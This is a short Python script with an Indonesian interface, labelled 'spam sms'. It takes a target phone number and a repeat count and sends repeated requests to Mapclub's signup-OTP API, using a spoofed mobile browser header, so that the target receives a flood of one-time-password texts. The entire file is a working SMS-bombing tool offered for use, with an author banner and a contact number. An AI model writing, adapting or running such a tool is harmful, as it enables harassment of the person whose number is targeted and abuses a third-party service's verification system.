import os,sys,requests,time
from requests import post

def mapclub(n):
	header = {
	"Connection": "keep-alive",
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	}
	target = {
	"phone":n
	}
	r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=target, headers=header)
	if "error" in r.text:
		print ("Spam",n,"[ Gagal ]")
	else:
		print ("Spam",n,"[ Berhasil ]")

def looping():
	no = int(input("Masukkan nomor target: "))
	i = int(input("Masukkan jumlah spam: "))
	for l in range(0,i,1):
		mapclub(no)
	else:
		print()

def lagi():
	lagi = str(input("Lagi (y/n)? "))
	if lagi == "y":
		os.system("clear")
		os.system("python3 spamsms.py")
	elif lagi == "n":
		os.system("clear")
		sys.exit()
	else:
		os.system("clear")
		lagi()
try:
	os.system("clear")
	os.system("figlet spam sms")
	print ("""
\t\t+------------------------------+
\t\t[-] Author   : Eng1n3
\t\t[-] Handphone: 089630682130
\t\t[-] Quotes   : No system is safe
\t\t+------------------------------+
""")
	looping()
	lagi()
except ValueError:
	print ("ERROR: Masukkan dengan benar!!!\n")
	looping()
except requests.exceptions.ConnectionError:
	print ("ERROR: Koneksi error!!!")
	sys.exit()
except KeyboardInterrupt:
	os.system("clear")
	print ("exit\n")

